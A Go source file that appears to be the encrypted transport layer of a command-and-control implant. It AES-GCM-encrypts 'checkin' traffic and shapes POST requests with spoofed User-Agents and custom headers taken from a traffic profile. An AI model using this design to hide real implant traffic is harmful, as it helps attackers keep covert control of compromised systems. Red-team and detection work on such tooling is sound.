package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
)

// EncKey: 32-byte hex AES-256 key set at build time via -ldflags.
// DEPRECATED in favour of ECDH key exchange (set automatically after first checkin).
// Still honoured when set, as a fallback for servers without ECDH support.
var EncKey = ""

var aesGCM cipher.AEAD

func initCrypto() error {
	if EncKey == "" {
		return nil
	}
	keyBytes, err := hex.DecodeString(EncKey)
	if err != nil || (len(keyBytes) != 16 && len(keyBytes) != 24 && len(keyBytes) != 32) {
		return fmt.Errorf("invalid EncKey: must be 32/48/64 hex chars")
	}
	return initCryptoWithKey(keyBytes)
}

// initCryptoWithKey is called both by initCrypto (static key) and deriveSessionKey (ECDH).
func initCryptoWithKey(key []byte) error {
	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}
	aesGCM, err = cipher.NewGCM(block)
	return err
}

func encryptPayload(plaintext []byte) ([]byte, error) {
	if aesGCM == nil {
		return plaintext, nil
	}
	nonce := make([]byte, aesGCM.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	ct := aesGCM.Seal(nonce, nonce, plaintext, nil)
	envelope := map[string]string{"enc": hex.EncodeToString(ct)}
	return json.Marshal(envelope)
}

func decryptPayload(data []byte) ([]byte, error) {
	if aesGCM == nil {
		return data, nil
	}
	var envelope struct {
		Enc string `json:"enc"`
	}
	if err := json.Unmarshal(data, &envelope); err != nil || envelope.Enc == "" {
		return data, nil
	}
	ct, err := hex.DecodeString(envelope.Enc)
	if err != nil {
		return nil, err
	}
	nonceSize := aesGCM.NonceSize()
	if len(ct) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ct := ct[:nonceSize], ct[nonceSize:]
	return aesGCM.Open(nil, nonce, ct, nil)
}

// encPost encrypts the body and fires the request using the active profile shape.
func encPost(url, _ string, body []byte) (*http.Response, error) {
	encrypted, err := encryptPayload(body)
	if err != nil {
		return nil, fmt.Errorf("encrypt: %w", err)
	}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(encrypted))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", ProfileContentType)
	if ProfileUA != "" {
		req.Header.Set("User-Agent", ProfileUA)
	}
	if ProfileHeaders != "" {
		for _, pair := range splitHeaders(ProfileHeaders) {
			req.Header.Set(pair[0], pair[1])
		}
	}
	if aesGCM != nil {
		req.Header.Set("X-Nyx-Enc", "1")
	}
	return client.Do(req)
}

func readDecrypted(resp *http.Response) ([]byte, error) {
	defer resp.Body.Close()
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	data = profileUnwrap(data)
	return decryptPayload(data)
}

func splitHeaders(h string) [][2]string {
	var out [][2]string
	for _, pair := range splitOn(h, '|') {
		kv := splitN(pair, ':', 2)
		if len(kv) == 2 {
			out = append(out, [2]string{trim(kv[0]), trim(kv[1])})
		}
	}
	return out
}

func splitOn(s string, sep byte) []string {
	var parts []string
	start := 0
	for i := 0; i < len(s); i++ {
		if s[i] == sep {
			parts = append(parts, s[start:i])
			start = i + 1
		}
	}
	parts = append(parts, s[start:])
	return parts
}

func splitN(s string, sep byte, n int) []string {
	var parts []string
	for i := 0; i < len(s) && len(parts) < n-1; i++ {
		if s[i] == sep {
			parts = append(parts, s[:i])
			s = s[i+1:]
			i = -1
		}
	}
	parts = append(parts, s)
	return parts
}

func trim(s string) string {
	start, end := 0, len(s)
	for start < end && (s[start] == ' ' || s[start] == '\t') {
		start++
	}
	for end > start && (s[end-1] == ' ' || s[end-1] == '\t') {
		end--
	}
	return s[start:end]
}
